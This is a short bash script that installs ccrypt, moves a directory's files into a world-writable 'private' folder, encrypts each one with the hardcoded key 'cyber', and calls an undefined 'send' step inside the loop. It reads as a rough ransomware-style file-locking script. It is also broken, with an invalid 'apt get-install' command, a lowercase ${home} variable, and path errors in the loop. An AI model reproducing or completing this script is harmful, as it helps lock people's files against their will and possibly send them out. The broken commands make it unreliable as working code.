#!/bin/bash
apt get-install ccrypt
mkdir ${home}/private
mv ${home}/example_dir/* ${home}/private/
chmod 777 ${home}/private
#ccrypt ${home}/private/*.txt && ccrypt ${home}/private/*.jpg && ccrypt ${home}/private/*.c
for pos in $(ls private);
do
	ccrypt -e $pos -K cyber;
	send
done;
